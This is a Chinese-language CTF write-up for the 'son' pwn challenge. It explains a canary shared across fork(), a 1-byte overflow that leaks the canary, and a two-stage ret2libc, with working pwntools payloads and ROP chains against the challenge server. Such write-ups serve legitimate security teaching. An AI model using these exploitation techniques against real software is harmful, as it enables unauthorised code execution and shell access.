# Writeup：son（fork() 共享 canary + 1-byte overflow 洩漏 canary → ret2libc）

> 目標檔案：[son](son)、[libc.so.6](libc.so.6)（題目附帶，Ubuntu GLIBC 2.35）
> 遠端：`nc ctf.adl.tw 10006`（**已實際連線驗證成功，拿到 flag**）
> 分類：Binary Exploitation / pwn（這題難度明顯比前幾題高一截）
> 用到的程式碼：[disasm.py](disasm.py)（反組譯/找字串，輸出見 [disasm_output.txt](disasm_output.txt)）、[son_solve.py](son_solve.py)（最終 exploit，兩階段，已驗證可重複使用）
>
> ```
> Flag: ADLCTF{LI13c_is_Pwn3r's_g00d_fr1end_smAsh_caNaRy_t0_W1N!}
> ```

這題把好幾個概念疊在一起：**真正的 stack canary**（不是前幾題靠「沒開」或「假警報」繞過，這次是貨真價實會擋你的那種）、**`fork()` 造成的「canary 共享」**、**利用 canary 設計上的弱點（最低位元組固定是 `\x00`）去「1-byte overflow 洩漏」它**，最後因為二進位本身沒有 `execve`/`system`，還要做一次**完整的 ret2libc**（題目貼心附上了 `libc.so.6`，省去 leak libc 版本的麻煩）。

---

## 1. 初步偵查

```bash
file son
```
```
son: ELF 64-bit LSB executable, x86-64, ... dynamically linked, ... not stripped
```

```bash
checksec --file=son
```
```
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

這次跟 `yes_ya_gonna_jump` 不一樣——`yes_ya_gonna_jump` 是 statically linked，"Canary found" 其實是誤判；**這題是 dynamically linked**，`__stack_chk_fail` 是正常從 `libc.so.6` 動態連結進來的，實際反組譯後也真的能在函式結尾看到完整的 canary 檢查指令——**這次是真的有 canary 保護**，不能再假設它不存在。

另外資料夾裡還附了 **`libc.so.6`**——這是一個強烈的訊號：**這題大概率需要 ret2libc**（而不是找現成的 win function），而且題目主動把對應版本的 libc 給你，省去另外用 `libc-database` 比對版本的功夫。

## 2. 列出 symbol table

```python
from pwn import ELF
e = ELF('son', checksec=False)
for name, addr in sorted(e.symbols.items(), key=lambda x: x[1]):
    if name:
        print(hex(addr), name)
```

這次的 import 跟函式名稱很有意思：

```
0x401164 fork       / plt.fork
0x401134 waitpid    / plt.waitpid
0x4012e2 gadget
0x40130e child
0x4013a5 parent
0x40141a main
```

`fork`/`waitpid` 這組 import，加上自訂函式名稱直接叫 `child`/`parent`——**題目在明示你：這題的核心機制跟 `fork()` 產生的父子行程有關**。而 `gadget` 這個函式名稱更直白：這顯然是作者刻意留給你用的 ROP gadget，不是正常程式邏輯的一部分。

## 3. 反組譯 `gadget()`——作者送的提示

```asm
0x4012e2: endbr64
0x4012e6: mov rax, qword ptr fs:[0x28]   ; 讀 canary
0x4012ef: mov qword ptr [rbp - 8], rax   ; 存到自己的 stack frame（正常的 canary 設置）
0x4012f3: xor eax, eax
0x4012f5: pop rdi                        ; <-- 這裡！
0x4012f6: ret                            ; <-- 跟這裡！
0x4012f7: nop
0x4012f8: mov rax, qword ptr [rbp - 8]
0x4012fc: sub rax, qword ptr fs:[0x28]
0x401305: je 0x40130c
0x401307: call __stack_chk_fail
0x40130c: ud2                            ; 永遠不會被正常執行到
```

這個函式本身在程式的正常流程裡**完全沒有被呼叫過**（`main`/`child`/`parent` 都沒有 `call gadget` 這行）。但它的機器碼裡剛好包含一組完美的 **`pop rdi; ret`**（位址 `0x4012f5`），後面緊接著單獨的一個 **`ret`**（位址 `0x4012f6`，就是 `pop rdi;ret` 這兩個 bytes 裡的第二個 byte，單獨拿出來剛好是合法的 `ret` 指令）。這是作者刻意放進去、讓我們之後組 ROP chain 時可以直接拿來用的現成 gadget，省去在整個二進位裡大海撈針找 gadget 的功夫。

## 4. 反組譯 `child()`：真正的漏洞藏在這裡

```c
char buf[0x20];                        // rbp-0x20，32 bytes；canary 在 rbp-0x08
puts("Oh nooooooooo, Dad's gone QQ");
puts("Tell me something:");

read(0, buf, 0x19);                    // <-- 讀 25 bytes，buf 卻只有 32 bytes？

printf("Child says: ");
printf("%s", buf);                     // <-- 把 buf 當字串印出來
puts("");
_exit(0);                              // <-- 直接退出，完全沒檢查 canary！
```

單看 `read(0, buf, 0x19)`：25 bytes 讀進 32 bytes 的 `buf`，表面上完全沒有 overflow，很容易掃過去就忽略。但關鍵在**精確的位置**：

```
buf 的記憶體佈局（rbp-0x20 到 rbp-0x01，共 32 bytes）：
┌────────────────────────────┬──────────────────────┐
│  buf[0..23]（24 bytes，真正可以自由使用的空間）  │ canary（8 bytes，rbp-8 ~ rbp-1） │
└────────────────────────────┴──────────────────────┘
索引：   0                   23  24                  31
```

`buf` 真正「安全」的使用空間只有 **24 bytes**（`buf[0]` 到 `buf[23]`），再往後的 `buf[24]` 就已經是 **canary 的第一個 byte**（因為 little-endian，`buf[24]` 正是 canary 這個 8-byte 值裡「最低位元組」存放的位置）。

而 `read()` 讀的長度是 **25 bytes**（`0x19`），正好比「安全空間」多 1 byte——**這 1 byte 剛好準確地蓋到 canary 的最低位元組**！

### 為什麼這 1 byte 這麼關鍵：canary 的「null-byte 設計」

Linux 的 stack canary 有個眾所皆知的設計：**它的最低位元組永遠固定是 `0x00`**。這是故意設計的，目的正是為了防禦這種 `printf("%s", buf)` 式的字串洩漏——只要 canary 緊接在一個字串緩衝區後面，`%s` 一讀到 canary 的第一個 byte（也就是那個固定的 `0x00`）就會立刻停止，canary 剩下的 7 bytes（真正隨機、具備保護效果的部分）永遠印不出來。

但如果我們能用自己的輸入，**精準地把這個 `0x00` 蓋成別的值**（像上面分析的，用 25 bytes 的 `read()` 剛好蓋到它），`%s` 就不會在那裡停下來，而會繼續往後印——**canary 剩下的 7 bytes 就會被完整洩漏出來**！

### 為什麼這裡敢蓋 canary 卻不會被抓到：`_exit()` 跳過檢查

正常情況下，蓋壞 canary 馬上就會在函式 `return` 前被抓到（`cmp` + `call __stack_chk_fail` → `abort()`）。但仔細看 `child()` 的結尾：它**沒有走到 `leave; ret`**，而是直接呼叫 **`_exit(0)`**（注意底線開頭，是直接呼叫系統層級的 `exit` syscall，不會執行 libc 包裝的清理流程，也完全不會經過函式自己的 epilogue）。由於 canary 檢查的那幾行指令，本來就寫在 `leave;ret` 之前——**只要永遠不走到那幾行，canary 被蓋成什麼都沒關係，不會被抓到**。

於是：`read()` 讓我們能蓋 1 byte、`printf("%s", buf)` 讓我們能在蓋完之後把後面的記憶體印出來、`_exit(0)` 讓我們蓋壞 canary 卻全身而退——三個條件疊在一起，就是一個完整可用的 **canary 洩漏漏洞**。

## 5. 反組譯 `parent()`：真正會被檢查的 overflow

```c
char buf[0x20];                        // 一樣 32 bytes，canary 在 rbp-8
puts("Kid's missing... Again?");
puts("Tell me something:");

read(0, buf, 0x80);                    // <-- 讀 128 bytes 進 32 bytes 的 buf！真正的 overflow

puts("Goodbye!");

// 這裡才是真正會執行到的canary檢查：
if (canary_on_stack != *(void**)(fs+0x28)) {
    __stack_chk_fail();                // 蓋錯 canary 會直接 abort，連線斷掉
}
// leave; ret
```

這才是這題名符其實的 overflow：`read()` 最多可以寫 128 bytes 進一個 32 bytes 的緩衝區，可以輕鬆蓋過 canary、saved rbp，一路蓋到 return address。**但這次結尾真的有做 canary 檢查**——如果我們蓋的 canary值不對，`__stack_chk_fail()` 會被呼叫，程式直接 `abort()`，連線斷掉，前功盡棄。

### 關鍵：`fork()` 讓 `child()` 跟 `parent()` 用的是同一個 canary

回到 `main()`：

```c
pid_t pid = fork();
if (pid == -1) { perror(...); exit(1); }
if (pid == 0) {
    child();             // 子行程（"son"）
} else {
    waitpid(pid, &status, 0);
    parent();            // 原本的行程繼續，變成「爸爸」
}
```

`fork()` 的語意是：把呼叫它的那個行程，**完整複製**成兩份一模一樣的記憶體（包括 stack、heap、以及存在 TLS 裡的 canary 值）。這個 canary 是在 `main()` 一開始（甚至更早，在 `__libc_start_main` 時）就已經決定好、存在 `fs:[0x28]` 這個固定位置的隨機值——**`fork()` 之後，子行程跟父行程的這個值完全相同，一個 byte 都不會差**。

這就是這題的核心設計：我們可以利用 `child()` 裡那個「蓋 1 byte + `_exit()` 跳過檢查」的漏洞，**安全地**（不會讓程式崩潰）把 canary 剩下的 7 bytes 印出來；拿到這個值之後，因為 `parent()` 用的是**完全相同**的 canary，我們就能在 `parent()` 真正的 128-byte overflow 裡，把正確的 canary 值原封不動填回去，順利通過檢查，繼續控制 return address。

## 6. 問題：知道了 canary，但還是沒有 win function

這題是動態連結，但 symbol table 裡**沒有 `execve`、也沒有 `system`**——程式本身從沒呼叫過這些函式，一樣被連結器丟掉了。不過因為是動態連結，而且題目**直接附上了對應的 `libc.so.6`**（`Ubuntu GLIBC 2.35`），這就是在告訴你：**這題要做完整的 ret2libc**：

1. 先利用 overflow，呼叫程式本身已經 import 好的 `puts()`，把某個 libc 函式「目前真正被載入的位址」印出來（這個位址平時被動態連結器填在 GOT 裡）。
2. 用這個洩漏到的位址，減掉我們手上這份 `libc.so.6` 裡同一個函式「理論上」的位址，算出 **libc 被載入到記憶體的實際基底位址**（`libc_base`）。
3. 有了 `libc_base`，就能精準算出 `system()` 的真實位址，以及 `libc.so.6` 裡現成的 `"/bin/sh"` 字串位址——組出 `system("/bin/sh")`，拿到 shell。

但這裡有個額外的麻煩：**`parent()` 只會呼叫一次，overflow 一次就結束了**——我們沒辦法在同一次 overflow 裡，一邊 leak libc base、一邊馬上用那個 base 組出最終的 `system()` 呼叫（因為 ROP chain 裡每個位址都要在**送出payload 之前**算好，但 `libc_base` 要等 leak 的結果送回來才知道）。

**解法：讓 ROP chain 的最後一步不要返回 `main()`，而是直接跳回 `parent()` 自己的開頭**，等於「騙」程式再執行一次 `parent()`，再給我們一次 `read()` 的機會。第二次進來時，我們已經拿到 `libc_base`，就能送出真正的 `system("/bin/sh")` payload。

## 7. 完整攻擊流程

### Offset 計算（跟前幾題一樣的算法，`child()`/`parent()` 都適用）

```
buf 大小 = 0x20 (32) bytes
saved rbp = 8 bytes
OFFSET = 0x20 + 0x8 = 0x28 (40) bytes，從 buf 起點到 return address
canary 位於 buf + 0x18（24）~ buf + 0x1f（31），也就是 OFFSET 前 8 bytes
```

### Step 1：洩漏 canary（利用 `child()`）

```python
p.recvuntil(b'Tell me something:\n')
payload = b'A' * 0x18 + b'A'      # 25 bytes，最後 1 byte 蓋掉 canary 最低 byte（原本是 0x00）
p.send(payload)

p.recvuntil(b'Child says: ')
leaked = p.recvuntil(b'\n', drop=True)
canary = b'\x00' + leaked[25:][:7]    # 補回固定的 0x00，拼出完整 8-byte canary
```

> ⚠️ **機率性風險**：canary 剩下的 7 bytes 本身是隨機值，萬一其中某個 byte 剛好也是 `0x00`，`%s` 會在那裡提前停止，這次就只能洩漏到不完整的 canary。這種情況發生的機率大約是 `7/256 ≈ 2.7%`（7 個 byte 裡任何一個恰好是 0 的近似機率）。遇到這種情況，**重新連線再試一次就好**——因為是全新的 process，canary 會重新隨機產生，大概 97% 的機會就能一次拿到完整的 7 bytes。

### Step 2：第一次 overflow——leak libc base，順便騙程式再進一次 `parent()`

```python
POP_RDI = 0x4012f5          # gadget() 裡的 "pop rdi; ret"
RET_ONLY = 0x4012f6         # 同一個 gadget 裡單獨的 "ret"（修正堆疊對齊用）
PARENT_ENTRY = 0x4013a5     # parent() 開頭

stage1_chain = flat(
    POP_RDI, e.got['puts'],   # rdi = puts 的 GOT 位址
    RET_ONLY,                  # 墊一個 ret，修正呼叫 puts@plt 前的堆疊對齊
    e.plt['puts'],              # puts(got.puts 的內容) -> 把裡面存的「真實位址」當字串印出來
    PARENT_ENTRY,                # 不回 main()，直接再執行一次 parent()
)

payload = b'A'*0x18 + canary + b'B'*8 + stage1_chain
p.send(payload)
```

`puts(got.puts)` 這招的原理：`got.puts` 這個位址裡存的「內容」，是動態連結器第一次解析 `puts` 時，填進去的**真正 libc 函式位址**（一個 8-byte 的指標）。把這個位址直接當參數傳給 `puts()`，`puts()` 不知道你給的其實是一個指標的「容器」，它只會乖乖把這 8 bytes 當成字串印出來——等於把這個指標值的 raw bytes 洩漏給我們（通常會在高位的 `0x00` byte 處被截斷，但低位 6 bytes 通常夠用，因為 64-bit 使用者空間位址的最高 2 bytes 必定是 `0x0000`）。

```python
p.recvuntil(b'Goodbye!\n')
leaked_puts = u64(p.recvline(keepends=False).ljust(8, b'\x00'))
libc.address = leaked_puts - libc.symbols['puts']
```

### Step 3：第二次 overflow（在被我們召喚回來的 `parent()` 裡）——真正的 `system("/bin/sh")`

```python
# 這裡改用 pwntools 的 ROP([e, libc]) 自動組 chain（原因見下方踩坑紀錄），
# 不要手動塞 RET_ONLY。
rop = ROP([e, libc])
rop.system(next(libc.search(b'/bin/sh\x00')))   # system("/bin/sh")

payload = b'A'*0x18 + canary + b'B'*8 + rop.chain()
p.send(payload)
```

因為我們是透過 `ret`（而不是正常的 `call`）跳進各個函式，每「跳」一次就讓堆疊指標 (`rsp`) 多移動 8 bytes，可能導致呼叫 `puts`/`system` 時堆疊沒有對齊到現代 glibc 內部（用到 SSE 指令如 `movaps`）要求的 16-byte 邊界，進而直接壞掉。

> ⚠️ **這裡有一個親自連線驗證才抓到的真實踩坑**：一開始我手動在呼叫 `puts@plt`/`system` 前，各自塞了一個 `RET_ONLY`（單獨的 `ret`）想「修正對齊」。連線實測後發現：**stage 1 的 `puts@plt` 這樣塞沒事**（leak 成功、也順利跳回 `parent()`，甚至連續跑 3 輪都穩定成功），**但 stage 2 呼叫 `system()` 這樣塞反而是錯的**——連線會在印出 `Goodbye!` 之後直接無聲斷線（`system()` 內部用到對齊指令的地方直接 crash）。手動計算「該墊幾個 `ret`」很容易算錯方向（多墊和少墊都可能導致 16-byte 對齊的奇偶性剛好相反），而且不同函式對齊需求是否真的會爆掉也不盡相同（`puts` 捱得住、`system` 捱不住）。**最後改成讓 `pwntools` 的 `ROP([e, libc])` 自動組這一段 chain**（讓它自己決定要不要墊、墊幾個），`rop.system(binsh_addr)` 組出來的 chain 完全不需要額外的 `ret`，呼叫就正常成功了。這題的教訓是：**手動對齊修正很容易猜錯方向，能讓 pwntools 自動組 call chain 時，優先讓工具處理，不要手動瞎猜。**

## 8. 完整 Exploit Script

完整版本見 [son_solve.py](son_solve.py)，核心流程跟上面第 7 節一致：

```python
from pwn import *

context.binary = e = ELF('son', checksec=False)
libc = ELF('libc.so.6', checksec=False)
p = remote('ctf.adl.tw', 10006, timeout=10)

# 1) 利用 child() 洩漏 canary
canary = leak_canary(p)

# 2) 第一次 overflow：leak puts 真實位址，算出 libc_base，並跳回 parent() 自己
# 3) 第二次 overflow：system("/bin/sh")

p.interactive()
```

連線成功拿到 shell 後：

```
find / -iname "*flag*" 2>/dev/null
# -> /home/son/flag
cat /home/son/flag
# -> ADLCTF{LI13c_is_Pwn3r's_g00d_fr1end_smAsh_caNaRy_t0_W1N!}
```

> ✅ **這題已經實際連線跑過，確認整套流程（canary 洩漏 → leak libc base → ret2self → system("/bin/sh")）在真實遠端上完全成立**，拿到的 shell 身分是 `uid=1000(son)`，flag 位於 `/home/son/flag`。中途也靠著實際連線才抓到上一節提到的手動對齊 bug，修正後的版本（即 [son_solve.py](son_solve.py) 現在的樣子）已驗證可重複成功。

---

## 重點整理

- **這題的 canary 是真的**：跟 `yes_ya_gonna_jump`（statically linked 造成的 checksec 誤判）不同，這題是動態連結，`parent()` 真的在結尾做了 canary 檢查，蓋錯會直接斷線，不能像前面幾題一樣無視它。
- **利用 `fork()` 讓兩個行程共享同一份 canary**：`fork()` 複製整個記憶體（包括 TLS 裡的 canary 值），只要能在其中一個行程（`child()`）裡**安全地**洩漏出這個值，另一個行程（`parent()`）的 canary 檢查就形同虛設。
- **canary 洩漏的關鍵是它自己的設計弱點**：canary 最低位元組固定是 `0x00`，本來是為了擋住 `%s` 式洩漏；但只要能找到一個「可以蓋掉這 1 byte、又不會被該函式自己的 canary 檢查抓到」的路徑（這題是靠 `_exit()` 直接跳過檢查），就能反過來利用這個固定的位置，精準地用 1-byte overflow 讓 `%s` 洩漏出剩下的 7 bytes。
- **沒有現成 win function 時的終極手段：ret2libc**：題目主動附上對應版本的 `libc.so.6`，就是暗示要用「leak 一個已解析的 libc 函式位址 → 算出 libc_base → 算出 `system`/`"/bin/sh"` 的真實位址 → 組 `system("/bin/sh")`」這套完整流程。
- **一次 overflow 不夠用時，想辦法讓函式「召喚自己」**：由於 leak 跟最終呼�劫是分兩個階段（leak 階段不知道最終要跳去哪裡），這裡沒有讓 ROP chain 走回 `main()` 結束，而是直接跳回 `parent()` 自己的開頭，等於白嫖了「再一次 overflow 的機會」，用來送出需要依賴 leak 結果才能組出來的最終 payload。
- **解題思路順序**：`file`/`checksec` 初步偵查（這次 "Canary found" 是真的，附帶的 `libc.so.6` 暗示要 ret2libc）→ 列 symbol table 看到 `fork`/`waitpid`/`child`/`parent`/`gadget` 這組線索 → 反組譯 `gadget()`，發現作者故意留的 `pop rdi;ret` → 反組譯 `child()`，注意到 `read()` 長度比「安全空間」多剛好 1 byte，加上結尾 `_exit()` 跳過檢查，兩者疊加變成可用的 canary 洩漏 → 反組譯 `parent()`，確認這裡才是真正會被檢查、也真正可控的 overflow → 想清楚 `fork()` 讓兩者共享同一份 canary 的原理 → 設計兩階段 payload：先 leak libc base 並讓程式跳回 `parent()`，再送出依賴 leak 結果組出的 `system("/bin/sh")` → 連線驗證（canary 洩漏偶爾會因為運氣不好需要重連；手動加的對齊 `ret` 曾經讓 `system()` 呼叫失敗，改用 pwntools 自動組 chain 後解決）→ 實際拿到 shell、找到並讀出 flag。
- **這題全程都已經實際連線 `ctf.adl.tw:10006` 跑過**：canary 洩漏、leak libc base、ret2self、最終 `system("/bin/sh")` 每一步都用真實流量驗證過，不是只靠靜態分析猜測；中途遇到的對齊 bug，也是因為有連線測試才抓得到、也才能驗證修正後確實有效。
